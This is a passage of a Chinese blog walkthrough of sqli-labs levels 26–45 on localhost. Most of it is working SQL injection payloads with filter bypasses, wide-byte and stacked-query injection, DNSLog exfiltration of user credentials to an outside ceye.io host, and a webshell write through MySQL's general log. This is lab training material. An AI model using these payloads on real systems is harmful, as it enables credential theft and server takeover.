+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251007152912322.png" alt="image-20251007152912322"></p>
+<p> 虽然我看了以下网上的教程，空格可以用%a0和%0b绕过，但是我最终发现绕过失败了，所以决定用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select (database())),0x7e),3)||&#x27;1</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=&#x27;security&#x27;)),0x7e),3)||&#x27;1</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_schema=&#x27;security&#x27; %26%26 table_name = &#x27;users&#x27;)),0x7e),3)||&#x27;1</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select (group_concat(username)) from (security.users)),0x7e),3)||&#x27;1</span><br><span class="line">1&#x27;||updatexml(1,concat(0x7e,(select (group_concat(passwoorrd)) from (security.users)),0x7e),3)||&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009102048097.png" alt="image-20251009102048097"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009102103001.png" alt="image-20251009102103001"></p>
+<h2 id="lab26a-括号闭合，没有报错信息"><a href="#lab26a-括号闭合，没有报错信息" class="headerlink" title="lab26a-括号闭合，没有报错信息"></a>lab26a-括号闭合，没有报错信息</h2><p>空格绕过失败，跳过</p>
+<h2 id="lab27-过滤了union和select"><a href="#lab27-过滤了union和select" class="headerlink" title="lab27-过滤了union和select"></a>lab27-过滤了union和select</h2><p>存在注入点</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009111805194.png" alt="image-20251009111805194"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009111817137.png" alt="image-20251009111817137"></p>
+<p>经过测试之后发现过滤了注释符号，空格以及union和select，尝试绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-27/?id=1&#x27;%09UnioN%09SeleCT%091,2,3||&#x27;1</span><br><span class="line">http://localhost/Less-27/?id=0&#x27;%09UnioN%09SeleCT%091,database(),3||&#x27;1</span><br><span class="line">http://localhost/Less-27/?id=0&#x27;%09UnioN%09SeleCT%091,(SelecT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=&#x27;security&#x27;),3||&#x27;1</span><br><span class="line">http://localhost/Less-27/?id=0&#x27;%09UnioN%09SeleCT%091,(SelecT%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;),3||&#x27;1</span><br><span class="line">http://localhost/Less-27/?id=0&#x27;%09UnioN%09SeleCT%091,(SelecT%09concat(username,&#x27;:&#x27;,password)%09from%09security.users%09limit%090,1),3||&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113131343.png" alt="image-20251009113131343"></p>
+<h2 id="lab27a-双引号闭合"><a href="#lab27a-双引号闭合" class="headerlink" title="lab27a-双引号闭合"></a>lab27a-双引号闭合</h2><p>根据报错可以判断出是双引号闭合，其余与lab27完全相同</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113225129.png" alt="image-20251009113225129"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113240001.png" alt="image-20251009113240001"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-27a/?id=1&quot;%09UnioN%09SeleCT%091,2,3||&quot;1</span><br><span class="line">http://localhost/Less-27a/?id=0&quot;%09UnioN%09SeleCT%091,database(),3||&quot;1</span><br><span class="line">http://localhost/Less-27a/?id=0&quot;%09UnioN%09SeleCT%091,(SelecT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=&#x27;security&#x27;),3||&quot;1</span><br><span class="line">http://localhost/Less-27a/?id=0&quot;%09UnioN%09SeleCT%091,(SelecT%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;),3||&quot;1</span><br><span class="line">http://localhost/Less-27a/?id=0&quot;%09UnioN%09SeleCT%091,(SelecT%09concat(username,&#x27;:&#x27;,password)%09from%09security.users%09limit%090,1),3||&quot;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009113756936.png" alt="image-20251009113756936"></p>
+<h2 id="lab28-忽略大小写"><a href="#lab28-忽略大小写" class="headerlink" title="lab28-忽略大小写"></a>lab28-忽略大小写</h2><p>用<code>union all select</code>绕过<code>union select</code>的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION SELECT&lt;-----注入点，可以用union all select绕过</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>单引号与括号闭合</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009115041788.png" alt="image-20251009115041788"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-28/?id=1&#x27;)%09UnioN%09all%09SeleCT%091,2,3||(&#x27;1</span><br><span class="line">http://localhost/Less-28/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,database(),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=&#x27;security&#x27;),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09concat(username,&#x27;:&#x27;,password)%09from%09security.users%09limit%090,1),3||(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009115937469.png" alt="image-20251009115937469"></p>
+<h2 id="lab28a-只对union-select进行了过滤"><a href="#lab28a-只对union-select进行了过滤" class="headerlink" title="lab28a-只对union select进行了过滤"></a>lab28a-只对union select进行了过滤</h2><p>过滤条件更简单了，上一题的payload仍然适用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-28a/?id=1&#x27;)%09UnioN%09all%09SeleCT%091,2,3||(&#x27;1</span><br><span class="line">http://localhost/Less-28a/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,database(),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28a/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=&#x27;security&#x27;),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28a/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema=&#x27;security&#x27;%09and%09table_name=&#x27;users&#x27;),3||(&#x27;1</span><br><span class="line">http://localhost/Less-28a/?id=0&#x27;)%09UnioN%09all%09SeleCT%091,(SelecT%09concat(username,&#x27;:&#x27;,password)%09from%09security.users%09limit%090,1),3||(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009120232000.png" alt="image-20251009120232000"></p>
+<h2 id="lab29-HTTP参数污染"><a href="#lab29-HTTP参数污染" class="headerlink" title="lab29-HTTP参数污染"></a>lab29-HTTP参数污染</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145027851.png" alt="image-20251009145027851"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145628367.png" alt="image-20251009145628367"></p>
+<p>测试成功，存在HTTP参数污染</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-29/?id=1&amp;id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-29/?id=1&amp;id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-29/?id=1&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line">http://localhost/Less-29/?id=1&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br><span class="line">http://localhost/Less-29/?id=1&amp;id=-1&#x27; union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145656331.png" alt="image-20251009145656331"></p>
+<h2 id="lab30-双引号闭合"><a href="#lab30-双引号闭合" class="headerlink" title="lab30-双引号闭合"></a>lab30-双引号闭合</h2><p>和29关一样，用双引号闭合即可，不再赘述</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-30/?id=1&amp;id=1&quot; union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-30/?id=1&amp;id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line">http://localhost/Less-30/?id=1&amp;id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br><span class="line">http://localhost/Less-30/?id=1&amp;id=-1&quot; union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009150047756.png" alt="image-20251009150047756"></p>
+<h2 id="lab31-双引号括号闭合"><a href="#lab31-双引号括号闭合" class="headerlink" title="lab31-双引号括号闭合"></a>lab31-双引号括号闭合</h2><p>除了闭合方式，都一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-31/?id=1&amp;id=1&quot;) union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-31/?id=1&amp;id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line">http://localhost/Less-31/?id=1&amp;id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br><span class="line">http://localhost/Less-31/?id=1&amp;id=-1&quot;) union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009150156919.png" alt="image-20251009150156919"></p>
+<h2 id="lab32-宽字节注入"><a href="#lab32-宽字节注入" class="headerlink" title="lab32-宽字节注入"></a>lab32-宽字节注入</h2><blockquote>
+<p>注意虽然html编码为gbk，但是由于php代码中有<code>mysql_query(&quot;SET NAMES gbk&quot;);</code>所以数据库使用了GBK编码</p>
+</blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009160222645.png" alt="image-20251009160222645"></p>
+<p>输入的单引号被转义了，没办法逃逸，尝试利用宽字节注入，注入成功</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009162713201.png" alt="image-20251009162713201"></p>
+<p>接下来就是构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-32/?id=1%df%27 union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-32/?id=-1%df%27 union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-32/?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">http://localhost/Less-32/?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</span><br><span class="line">http://localhost/Less-32/?id=-1%df%27 union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>0x7573657273</code>是<code>users</code>的十六进制编码</p>
+</blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009163846566.png" alt="image-20251009163846566"></p>
+<h2 id="lab33-宽字节注入"><a href="#lab33-宽字节注入" class="headerlink" title="lab33-宽字节注入"></a>lab33-宽字节注入</h2><p>与lab32一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-33/?id=1%df%27 union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-33/?id=-1%df%27 union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-33/?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">http://localhost/Less-33/?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</span><br><span class="line">http://localhost/Less-33/?id=-1%df%27 union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009164234000.png" alt="image-20251009164234000"></p>
+<h2 id="lab34-post类型宽字节注入"><a href="#lab34-post类型宽字节注入" class="headerlink" title="lab34-post类型宽字节注入"></a>lab34-post类型宽字节注入</h2><p>与lab32一样</p>
+<blockquote>
+<p>注意构造<code>uname=admin%df&#39;#&amp;passwd=233&amp;submit=Submit</code>会返回，无法成功查询到admin用户的用户信息</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013113448529.png" alt="image-20251013113448529"></p>
+<p>这是因为username字段是字符串类型的，它不会跳过宽字节注入后多出的汉字。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&#x27; union select 1,2 FROM users#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=admin%df&#x27; union select 1,database()#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=admin%df&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=admin%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=admin%df&#x27; union select 1,group_concat(username,password) from security.users#&amp;passwd=233&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013113842064.png" alt="image-20251013113842064"></p>
+<h2 id="lab35-联合查询宽字节注入"><a href="#lab35-联合查询宽字节注入" class="headerlink" title="lab35-联合查询宽字节注入"></a>lab35-联合查询宽字节注入</h2><p>存在注入点并且转移了单引号</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114139453.png" alt="image-20251013114139453"></p>
+<p>判断出是数字型注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114204973.png" alt="image-20251013114204973"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114224359.png" alt="image-20251013114224359"></p>
+<p>有三列回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114244004.png" alt="image-20251013114244004"></p>
+<p>数据库名是security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114315739.png" alt="image-20251013114315739"></p>
+<p>tablename为emails,referers,uagents,users</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114457237.png" alt="image-20251013114457237"></p>
+<p>报错，转用十六进制编码绕过</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114735083.png" alt="image-20251013114735083"></p>
+<p>列名id,username,password</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013114704458.png" alt="image-20251013114704458"></p>
+<p>注入成功</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115006579.png" alt="image-20251013115006579"></p>
+<h2 id="lab36-mysql-real-escape-string进行转义"><a href="#lab36-mysql-real-escape-string进行转义" class="headerlink" title="lab36-mysql_real_escape_string进行转义"></a>lab36-mysql_real_escape_string进行转义</h2><p>同32关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-36/?id=1%df%27 union select 1,2,3 --+</span><br><span class="line">http://localhost/Less-36/?id=-1%df%27 union select 1,database(),3 --+</span><br><span class="line">http://localhost/Less-36/?id=-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br><span class="line">http://localhost/Less-36/?id=-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</span><br><span class="line">http://localhost/Less-36/?id=-1%df%27 union select 1,group_concat(username,password),3 from security.users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115345261.png" alt="image-20251013115345261"></p>
+<h2 id="lab37-post类型mysql-real-escape-string函数转义"><a href="#lab37-post类型mysql-real-escape-string函数转义" class="headerlink" title="lab37-post类型mysql_real_escape_string函数转义"></a>lab37-post类型mysql_real_escape_string函数转义</h2><p>同34关</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname=1%df&#x27; union select 1,2 FROM users#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=1%df&#x27; union select 1,database()#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=1%df&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=1%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273#&amp;passwd=233&amp;submit=Submit</span><br><span class="line">uname=1%df&#x27; union select 1,group_concat(username,password) from security.users#&amp;passwd=233&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251013115549028.png" alt="image-20251013115549028"></p>
+<h2 id="lab38-堆叠注入"><a href="#lab38-堆叠注入" class="headerlink" title="lab38-堆叠注入"></a>lab38-堆叠注入</h2><p>成功执行多条语句，存在堆叠注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014112936917.png" alt="image-20251014112936917"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014112956369.png" alt="image-20251014112956369"></p>
+<h3 id="DNSLog数据外带-1"><a href="#DNSLog数据外带-1" class="headerlink" title="DNSLog数据外带"></a>DNSLog数据外带</h3><p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from users limit 0,1),&#x27;.3g5qjq.ceye.io&#x27;))--+</span><br></pre></td></tr></table></figure>
+
+<p>DNS查询成功</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014115302605.png" alt="image-20251014115302605"></p>
+<p>将<code>44756d627e31</code>hex解码获得账号密码</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014115624240.png" alt="image-20251014115624240"></p>
+<h3 id="开启日志Getshell-1"><a href="#开启日志Getshell-1" class="headerlink" title="开启日志Getshell"></a>开启日志Getshell</h3><p>利用 MySQL 的日志功能，将恶意的 PHP 代码（WebShell）作为日志内容，写入到 Web 目录下的一个 PHP 文件中，从而远程控制服务器。开启general_log然后修改日志文件的位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/shell.php&#x27;;--+</span><br></pre></td></tr></table></figure>
+
+<p>接下来就可以在日志文件里面写入恶意代码。</p>
+<p>输入<code>?id=1&#39;;select &lt;?php phpinfo();?&gt;</code>,日志文件显示如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/shell.php</span><br><span class="line">200517  8:47:04       10 Connect    root@localhost on security</span><br><span class="line">           10 Init DB    security</span><br><span class="line">           10 Query    SELECT * FROM users WHERE id=&#x27;1&#x27;;select &#x27;&lt;?php phpinfo();?&gt;&#x27;-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<h2 id="lab39-整形闭合堆叠注入"><a href="#lab39-整形闭合堆叠注入" class="headerlink" title="lab39-整形闭合堆叠注入"></a>lab39-整形闭合堆叠注入</h2><p>只改变了闭合方式，其他和上一关一样，不再赘述</p>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody></table>
+<h2 id="lab40-单引号加括号闭合堆叠注入"><a href="#lab40-单引号加括号闭合堆叠注入" class="headerlink" title="lab40-单引号加括号闭合堆叠注入"></a>lab40-单引号加括号闭合堆叠注入</h2><p>只改变了闭合方式，其他和上一关一样，不再赘述</p>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=(&#39;$id&#39;)</code></td>
+</tr>
+</tbody></table>
+<h2 id="lab41-id为整数堆叠注入"><a href="#lab41-id为整数堆叠注入" class="headerlink" title="lab41-id为整数堆叠注入"></a>lab41-id为整数堆叠注入</h2><p>没什么好说的</p>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody></table>
+<h2 id="lab42-post类型堆叠注入"><a href="#lab42-post类型堆叠注入" class="headerlink" title="lab42-post类型堆叠注入"></a>lab42-post类型堆叠注入</h2><p>观察源代码发现username用mysqli_real_escape_string进行转移但是password没有转移所以在password进行SQL注入更方便</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;--&#x27;,username,password)) from users limit 0,1),&#x27;.3g5qjq.ceye.io\\abc&#x27;))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150235821.png" alt="image-20251014150235821"></p>
+<p>成功获取账号密码</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150151389.png" alt="image-20251014150151389"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251014150208037.png" alt="image-20251014150208037"></p>
+<h2 id="lab43-post类型堆叠注入"><a href="#lab43-post类型堆叠注入" class="headerlink" title="lab43-post类型堆叠注入"></a>lab43-post类型堆叠注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合、报错、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username=(&#39;$username&#39;)</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已，不再赘述。</p>
+<h2 id="lab44-post类型堆叠注入"><a href="#lab44-post类型堆叠注入" class="headerlink" title="lab44-post类型堆叠注入"></a>lab44-post类型堆叠注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username=&#39;$username&#39;</code></td>
+</tr>
+</tbody></table>
+<p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
+<h2 id="lab45-post类型堆叠注入"><a href="#lab45-post类型堆叠注入" class="headerlink" title="lab45-post类型堆叠注入"></a>lab45-post类型堆叠注入</h2><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>联合、布尔盲注、延时盲注、堆叠注入</td>
+<td><code>username=(&#39;$username&#39;)</code></td>
